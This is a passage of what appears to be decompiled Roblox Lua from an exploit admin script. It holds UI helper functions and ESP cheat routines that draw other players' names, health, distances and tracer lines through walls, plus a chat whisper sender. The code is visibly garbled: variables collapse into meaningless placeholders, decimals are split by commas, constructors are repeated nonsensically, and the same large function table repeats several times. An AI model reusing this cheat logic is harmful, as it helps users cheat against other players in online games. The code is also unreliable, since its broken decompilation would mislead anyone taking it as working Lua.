              vb.insert({}, fk)
            else
              vb.insert({}, {
                "<font color=\"rgb(%i, %i, %i)\">" .. fk .. "</font>"
              })
            end
          end
          pcall(function()
            delay(150, function()
              va:Disconnect()
            end)
          end)
        end,
        Locate2 = function(a, b)
          coroutine.wrap(function()
            if va(vb) then
              vc.Parent = UI
              vc.Name = vd:GenerateGUID()
              vc.AlwaysOnTop = true
              vc.Adornee = vb.Character.Head
              vc.Size = UDim2.new(0, 200, 0, 50)
              vc.StudsOffset = Vector3.new(0, 4, 0)
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(0, 255, 0)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 10
              Instance.new("TextLabel", vc).Text = vb.Name
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(152, 152, 152)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 8
              AddConnection((RunService.Heartbeat:Connect(function()
                if not vc(vb) then
                end
                if not vd(vb) and not vc(vb) then
                  vg.Text = ([[

 
 
 [%s] [%s/%s]]]):format(math.floor(ve.CurrentCamera.CFrame.p - vd(vb).CFrame.p.Magnitude), math.floor(vc(vb).Health), math.floor(vc(vb).MaxHealth))
                else
                  EspLoop:Disconnect()
                  vh:Destroy()
                end
              end)))
              AddConnection(Players.PlayerRemoving:Connect(function(a)
                if a == va then
                  vb:Destroy()
                end
              end))
            end
          end)()
          return function()
            va:Destroy()
          end
        end,
        Vector3toVector2 = function(a)
          return Vector2.new(va:WorldToViewportPoint(a).X, va:WorldToViewportPoint(a).Y)
        end,
        Locate = function(a, b, c)
          if b then
            return va.Locate2(a, b)
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Text")
          Drawing.new("Text").Position = 5 + 6
          Drawing.new("Text").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Text").OutlineColor = c or Color3.new()
          Drawing.new("Text").Text = ([[
%s
[%s] [%s/%s]]]):format(a.Name, math.floor(vd(a)), math.floor(ve(a).Health), math.floor(ve(a).MaxHealth))
          Drawing.new("Text").Size = 16
          Drawing.new("Text").Transparency = 1
          Drawing.new("Text").Center = true
          Drawing.new("Text").Outline = true
          Drawing.new("Text").Visible = true
          vg[Drawing.new("Text")] = a
          return function()
            va:Remove()
            vb[va] = nil
          end
        end,
        UpdateLocations = function(a)
          if a then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if not va and vb(fe).Head and vc:WorldToViewportPoint(vb(fe).Head.Position) then
                  fd.Visible = true
                  fd.Position = 7 + 8
                  fd.Text = ([[
%s
[%s] [%s/%s]]]):format(fe.Name, math.floor(ve(fe)), math.floor(vg(fe).Health), math.floor(vg(fe).MaxHealth))
                else
                  fd.Visible = false
                end
              end
            end))
          end
        end,
        CheckTag = function(a)
          if nil or not a:IsA("Player") then
            return nil
          end
          return PlayerTags[tostring(a.UserId):gsub(".", function(a)
            return a:byte()
          end)] or nil
        end,
        AddTag = function(a)
          if not a then
            return
          end
          if not va(a.Player) then
            return
          end
          Instance.new("BillboardGui").Parent = UI
          Instance.new("BillboardGui").Name = vb:GenerateGUID()
          Instance.new("BillboardGui").AlwaysOnTop = true
          Instance.new("BillboardGui").Adornee = va(a.Player).Head or nil
          Instance.new("BillboardGui").Enabled = true or va(a.Player).Head and false
          Instance.new("BillboardGui").Size = UDim2.new(0, 200, 0, 50)
          Instance.new("BillboardGui").StudsOffset = Vector3.new(0, 4, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Name = vb:GenerateGUID()
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextStrokeTransparency = 0,6
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).BackgroundTransparency = 1
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.new(0, 255, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Size = UDim2.new(0, 200, 0, 50)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextScaled = false
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextSize = 15
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Text = ("%s (%s)"):format(a.Name, a.Tag)
          if a.Rainbow then
            vc.Rainbow((Instance.new("TextLabel", (Instance.new("BillboardGui")))))
          end
          if not va(a.Player) then
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.fromRGB(a.Colour[1], a.Colour[2], a.Colour[3])
          end
          AddConnection((a.Player.CharacterAdded:Connect(function()
            va.Adornee = vb.Player.Character:WaitForChild("Head")
          end)))
          AddConnection(Players.PlayerRemoving:Connect(function(a)
            if a == va.Player then
              vb:Disconnect()
              vc:Destroy()
            end
          end))
        end,
        TextFont = function(a, b)
          b = va.concat(b, ",")
          a:gsub(".", function(a)
            va[2 + 1] = a
          end)
          return va.concat(va.map({}, function(a, b)
            return ("<font color=\"rgb(%s)\">%s</font>"):format(va, b)
          end)) .. " "
        end,
        Trace = function(a, b)
          if not Drawing then
            return
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Line")
          Drawing.new("Line").To = Vector2.new(vb.Camera:WorldToViewportPoint(va(a).Head.Position).X, vb.Camera:WorldToViewportPoint(va(a).Head.Position).Y)
          Drawing.new("Line").From = Vector2.new(vb.Camera.ViewportSize.X / 2, vb.Camera.ViewportSize.Y)
          Drawing.new("Line").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Line").Thickness = 0,1
          Drawing.new("Line").Transparency = 1
          Drawing.new("Line").Visible = true
          vd[a] = Drawing.new("Line")
          return function()
            va:Remove()
            vb[vc] = nil
          end
        end,
        UpdateTracers = function()
          if nil then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if va then
                elseif vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position) then
                  fe.Visible = true
                  fe.To = Vector2.new(vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).X, vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).Y)
                else
                  fe.Visible = false
                end
              end
            end))
          end
        end,
        DestroyTracers = function()
          for fd, fe in next, Tracers, nil do
            fe:Remove()
          end
          if not Tracers then
            va:Disconnect()
          end
        end,
        DestroyDrawings = function()
          for fd, fe in next, va, nil do
            fe:Remove()
          end
          if vb then
            vb:Disconnect()
          end
          if not vb then
            vc:Disconnect()
          end
        end
      }.Click(UI.ChatLogs.Toggle, "BackgroundColor3")
      {
        Tween = function(a, b, c, d, e)
          va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e):Play()
          return (va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e))
        end,
        MultColor3 = function(a, b)
          return Color3.new(math.clamp(a.R * b, 0, 1), math.clamp(a.G * b, 0, 1), math.clamp(a.B * b, 0, 1))
        end,
        Click = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseButton1Down" .. #vb] = a.MouseButton1Down:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,3, vc)
          end)
          vb["ObjectMouseButton1Up" .. #vb] = a.MouseButton1Up:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,4, vc)
          end)
        end,
        Blink = function(a, b, c, d)
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = d
          }).Completed:Wait()
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = c
          }).Completed:Wait()
        end,
        Hover = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
        end,
        Draggable = function(a, b)
          b = b or a
          vc["UIInputBegan" .. #vc] = a.InputBegan:Connect(function(a)
            if (a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
              va = true
              vb = a.Position
              vc = vd.Position
              ve["InputChanged" .. #ve] = a.Changed:Connect(function()
                if va.UserInputState == Enum.UserInputState.End then
                  vb = false
                end
              end)
            end
          end)
          vc["UiInputChanged" .. #vc] = a.InputChanged:Connect(function(a)
            if a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch then
              va = a
            end
          end)
          vc["UserInputServiceInputChanged" .. #vc] = UserInputService.InputChanged:Connect(function(a)
            if a == va and vb then
              vc(a)
            end
          end)
        end,
        SmoothScroll = function(a, b)
          a.ScrollingEnabled = false
          a:Clone():ClearAllChildren()
          a:Clone().BackgroundTransparency = 1
          a:Clone().ScrollBarImageTransparency = 1
          a:Clone().ZIndex = 3 + 1
          a:Clone().Name = "_smoothinputframe"
          a:Clone().ScrollingEnabled = true
          a:Clone().Parent = a.Parent
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("CanvasSize");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Position");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Rotation");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollingDirection");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollBarThickness");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderSizePixel");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ElasticBehavior");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("SizeConstraint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ZIndex");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderColor3");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Size");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("AnchorPoint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Visible")
          va["smoothConnection" .. #va] = RunService.RenderStepped:Connect(function()
            va.CanvasPosition = 3 + 0
          end)
          va["contentAncestryChanged" .. #va] = a.AncestryChanged:Connect(function()
            if va.Parent == nil then
              vb:Destroy()
              vc:Disconnect()
            end
          end)
        end,
        TweenAllTransToObject = function(a, b, c)
          for fl, fm in next, a:GetDescendants(), nil do
            if b and b then
            end
            if b then
              if fm:IsA("TextButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  TextTransparency = c:GetDescendants()[fl].TextTransparency,
                  TextStrokeTransparency = c:GetDescendants()[fl].TextStrokeTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ImageLabel") or fm:IsA("ImageButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  ImageTransparency = c:GetDescendants()[fl].ImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ScrollingFrame") then
                va.Tween(fm, "Sine", "Out", b, {
                  ScrollBarImageTransparency = c:GetDescendants()[fl].ScrollBarImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              else
                va.Tween(fm, "Sine", "Out", b, {
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {
            BackgroundTransparency = c.BackgroundTransparency
          }))
        end,
        SetAllTrans = function(a)
          a.BackgroundTransparency = 1
          for fe, fg in ipairs(a:GetDescendants()) do
            if not fg:IsA("UIListLayout") then
              fg.BackgroundTransparency = 1
              if fg:IsA("TextLabel") or fg:IsA("TextBox") or fg:IsA("TextButton") then
                fg.TextTransparency = 1
              elseif fg:IsA("ImageLabel") or fg:IsA("ImageButton") then
                fg.ImageTransparency = 1
              elseif fg:IsA("ScrollingFrame") then
                fg.ScrollBarImageTransparency = 1
              end
            end
          end
        end,
        TweenAllTrans = function(a, b)
          for fh, fj in ipairs(a:GetDescendants()) do
            if b and b then
            end
            if b then
              if fj:IsA("TextButton") then
                va.Tween(fj, "Sine", "Out", b, {TextTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ImageTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ScrollBarImageTransparency = 1, BackgroundTransparency = 1})
              else
                va.Tween(fj, "Sine", "Out", b, {BackgroundTransparency = 1})
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {BackgroundTransparency = 1}))
        end,
        Notify = function(a, b, c, d)
          if not a or a == LocalPlayer then
            UI.Notification:Clone().Message.Text = c
            UI.Notification:Clone().Title.Text = b or "Notification"
            va.SetAllTrans((UI.Notification:Clone()))
            va.Click(UI.Notification:Clone().Close, "TextColor3")
            UI.Notification:Clone().Visible = true
            if c:len() > 35 then
              UI.Notification:Clone().AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.RichText = true
              UI.Notification:Clone().Message.TextScaled = false
              UI.Notification:Clone().Message.TextYAlignment = Enum.TextYAlignment.Top
              UI.Notification:Clone().DropShadow.AutomaticSize = Enum.AutomaticSize.Y
            end
            UI.Notification:Clone().Parent = UI.NotificationBar
            coroutine.wrap(function()
              va.TweenAllTransToObject(vb, 0,5, vc).Completed:Wait()
              wait(vd or 5)
              if not va.TweenAllTransToObject(vb, 0,5, vc) then
                ve()
              end
            end)()
            vb["CloneClose" .. #vb] = UI.Notification:Clone().Close.MouseButton1Click:Connect(function()
              va()
            end)
            return (UI.Notification:Clone())
          else
            vc.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(("/w %s [FA] %s: %s"):format(a.Name, b, c), "All")
          end
        end,
        MatchSearch = function(a, b)
          return a == va.sub(b, 1, #a)
        end,
        StringFind = function(a, b)
          for fg, fh in ipairs(a) do
            if not b then
              return fh
            end
          end
        end,
        GetPlayerArgs = function(a)
          a = a:lower()
          if va.StringFind({
            "all",
            "others",
            "random",
            "me",
            "nearest",
            "farthest"
          }, a) then
            return va.StringFind({
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            }, a)
          end
          for fh, fj in next, Players:GetPlayers(), nil do
            if fj.Name ~= fj.DisplayName and va.MatchSearch(a, fj.DisplayName:lower()) then
              return fj.DisplayName:lower()
            end
            if not {
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            } then
              return fj.Name:lower()
            end
          end
        end,
        ToolTip = function(a, b)
          a.MouseEnter:Connect(function()
            if va.BackgroundTransparency <= 1 and not vb then
              vb = UI.ToolTip:Clone()
              vb.Text = vd
              vb.TextScaled = vc and vc:GetTextSize(vd, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24 and false
              vb.Visible = true
              vb.Parent = UI
            end
          end)
          a.MouseLeave:Connect(function()
            if not nil then
              va:Destroy()
              va = nil
            end
          end)
          if LocalPlayer then
            LocalPlayer:GetMouse().Move:Connect(function()
              if not nil then
                va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
              end
            end)
          else
            delay(3, function()
              LocalPlayer = Players.LocalPlayer
              va = LocalPlayer:GetMouse()
              va.Move:Connect(function()
                if va then
                  va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
                end
              end)
            end)
          end
        end,
        ClearAllObjects = function(a)
          for fe, fg in ipairs(a:GetChildren()) do
            if ipairs(a:GetChildren()) then
              fg:Destroy()
            end
          end
        end,
        Rainbow = function(a)
          a.RichText = true
          for fk in va.gmatch(a.Text, ".") do
            if va.match(fk, "%s") then
              vb.insert({}, fk)
            else
              vb.insert({}, {
                "<font color=\"rgb(%i, %i, %i)\">" .. fk .. "</font>"
              })
            end
          end
          pcall(function()
            delay(150, function()
              va:Disconnect()
            end)
          end)
        end,
        Locate2 = function(a, b)
          coroutine.wrap(function()
            if va(vb) then
              vc.Parent = UI
              vc.Name = vd:GenerateGUID()
              vc.AlwaysOnTop = true
              vc.Adornee = vb.Character.Head
              vc.Size = UDim2.new(0, 200, 0, 50)
              vc.StudsOffset = Vector3.new(0, 4, 0)
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(0, 255, 0)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 10
              Instance.new("TextLabel", vc).Text = vb.Name
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(152, 152, 152)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 8
              AddConnection((RunService.Heartbeat:Connect(function()
                if not vc(vb) then
                end
                if not vd(vb) and not vc(vb) then
                  vg.Text = ([[

 
 
 [%s] [%s/%s]]]):format(math.floor(ve.CurrentCamera.CFrame.p - vd(vb).CFrame.p.Magnitude), math.floor(vc(vb).Health), math.floor(vc(vb).MaxHealth))
                else
                  EspLoop:Disconnect()
                  vh:Destroy()
                end
              end)))
              AddConnection(Players.PlayerRemoving:Connect(function(a)
                if a == va then
                  vb:Destroy()
                end
              end))
            end
          end)()
          return function()
            va:Destroy()
          end
        end,
        Vector3toVector2 = function(a)
          return Vector2.new(va:WorldToViewportPoint(a).X, va:WorldToViewportPoint(a).Y)
        end,
        Locate = function(a, b, c)
          if b then
            return va.Locate2(a, b)
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Text")
          Drawing.new("Text").Position = 5 + 6
          Drawing.new("Text").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Text").OutlineColor = c or Color3.new()
          Drawing.new("Text").Text = ([[
%s
[%s] [%s/%s]]]):format(a.Name, math.floor(vd(a)), math.floor(ve(a).Health), math.floor(ve(a).MaxHealth))
          Drawing.new("Text").Size = 16
          Drawing.new("Text").Transparency = 1
          Drawing.new("Text").Center = true
          Drawing.new("Text").Outline = true
          Drawing.new("Text").Visible = true
          vg[Drawing.new("Text")] = a
          return function()
            va:Remove()
            vb[va] = nil
          end
        end,
        UpdateLocations = function(a)
          if a then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if not va and vb(fe).Head and vc:WorldToViewportPoint(vb(fe).Head.Position) then
                  fd.Visible = true
                  fd.Position = 7 + 8
                  fd.Text = ([[
%s
[%s] [%s/%s]]]):format(fe.Name, math.floor(ve(fe)), math.floor(vg(fe).Health), math.floor(vg(fe).MaxHealth))
                else
                  fd.Visible = false
                end
              end
            end))
          end
        end,
        CheckTag = function(a)
          if nil or not a:IsA("Player") then
            return nil
          end
          return PlayerTags[tostring(a.UserId):gsub(".", function(a)
            return a:byte()
          end)] or nil
        end,
        AddTag = function(a)
          if not a then
            return
          end
          if not va(a.Player) then
            return
          end
          Instance.new("BillboardGui").Parent = UI
          Instance.new("BillboardGui").Name = vb:GenerateGUID()
          Instance.new("BillboardGui").AlwaysOnTop = true
          Instance.new("BillboardGui").Adornee = va(a.Player).Head or nil
          Instance.new("BillboardGui").Enabled = true or va(a.Player).Head and false
          Instance.new("BillboardGui").Size = UDim2.new(0, 200, 0, 50)
          Instance.new("BillboardGui").StudsOffset = Vector3.new(0, 4, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Name = vb:GenerateGUID()
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextStrokeTransparency = 0,6
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).BackgroundTransparency = 1
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.new(0, 255, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Size = UDim2.new(0, 200, 0, 50)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextScaled = false
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextSize = 15
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Text = ("%s (%s)"):format(a.Name, a.Tag)
          if a.Rainbow then
            vc.Rainbow((Instance.new("TextLabel", (Instance.new("BillboardGui")))))
          end
          if not va(a.Player) then
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.fromRGB(a.Colour[1], a.Colour[2], a.Colour[3])
          end
          AddConnection((a.Player.CharacterAdded:Connect(function()
            va.Adornee = vb.Player.Character:WaitForChild("Head")
          end)))
          AddConnection(Players.PlayerRemoving:Connect(function(a)
            if a == va.Player then
              vb:Disconnect()
              vc:Destroy()
            end
          end))
        end,
        TextFont = function(a, b)
          b = va.concat(b, ",")
          a:gsub(".", function(a)
            va[2 + 1] = a
          end)
          return va.concat(va.map({}, function(a, b)
            return ("<font color=\"rgb(%s)\">%s</font>"):format(va, b)
          end)) .. " "
        end,
        Trace = function(a, b)
          if not Drawing then
            return
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Line")
          Drawing.new("Line").To = Vector2.new(vb.Camera:WorldToViewportPoint(va(a).Head.Position).X, vb.Camera:WorldToViewportPoint(va(a).Head.Position).Y)
          Drawing.new("Line").From = Vector2.new(vb.Camera.ViewportSize.X / 2, vb.Camera.ViewportSize.Y)
          Drawing.new("Line").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Line").Thickness = 0,1
          Drawing.new("Line").Transparency = 1
          Drawing.new("Line").Visible = true
          vd[a] = Drawing.new("Line")
          return function()
            va:Remove()
            vb[vc] = nil
          end
        end,
        UpdateTracers = function()
          if nil then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if va then
                elseif vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position) then
                  fe.Visible = true
                  fe.To = Vector2.new(vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).X, vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).Y)
                else
                  fe.Visible = false
                end
              end
            end))
          end
        end,
        DestroyTracers = function()
          for fd, fe in next, Tracers, nil do
            fe:Remove()
          end
          if not Tracers then
            va:Disconnect()
          end
        end,
        DestroyDrawings = function()
          for fd, fe in next, va, nil do
            fe:Remove()
          end
          if vb then
            vb:Disconnect()
          end
          if not vb then
            vc:Disconnect()
          end
        end
      }.Click(UI.ChatLogs.Close, "TextColor3")
      {
        Tween = function(a, b, c, d, e)
          va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e):Play()
          return (va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e))
        end,
        MultColor3 = function(a, b)
          return Color3.new(math.clamp(a.R * b, 0, 1), math.clamp(a.G * b, 0, 1), math.clamp(a.B * b, 0, 1))
        end,
        Click = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseButton1Down" .. #vb] = a.MouseButton1Down:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,3, vc)
          end)
          vb["ObjectMouseButton1Up" .. #vb] = a.MouseButton1Up:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,4, vc)
          end)
        end,
        Blink = function(a, b, c, d)
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = d
          }).Completed:Wait()
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = c
          }).Completed:Wait()
        end,
        Hover = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
        end,
        Draggable = function(a, b)
          b = b or a
          vc["UIInputBegan" .. #vc] = a.InputBegan:Connect(function(a)
            if (a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
              va = true
              vb = a.Position
              vc = vd.Position
              ve["InputChanged" .. #ve] = a.Changed:Connect(function()
                if va.UserInputState == Enum.UserInputState.End then
                  vb = false
                end
              end)
            end
          end)
          vc["UiInputChanged" .. #vc] = a.InputChanged:Connect(function(a)
            if a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch then
              va = a
            end
          end)
          vc["UserInputServiceInputChanged" .. #vc] = UserInputService.InputChanged:Connect(function(a)
            if a == va and vb then
              vc(a)
            end
          end)
        end,
        SmoothScroll = function(a, b)
          a.ScrollingEnabled = false
          a:Clone():ClearAllChildren()
          a:Clone().BackgroundTransparency = 1
          a:Clone().ScrollBarImageTransparency = 1
          a:Clone().ZIndex = 3 + 1
          a:Clone().Name = "_smoothinputframe"
          a:Clone().ScrollingEnabled = true
          a:Clone().Parent = a.Parent
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("CanvasSize");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Position");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Rotation");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollingDirection");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollBarThickness");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderSizePixel");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ElasticBehavior");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("SizeConstraint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ZIndex");
          (function(a)
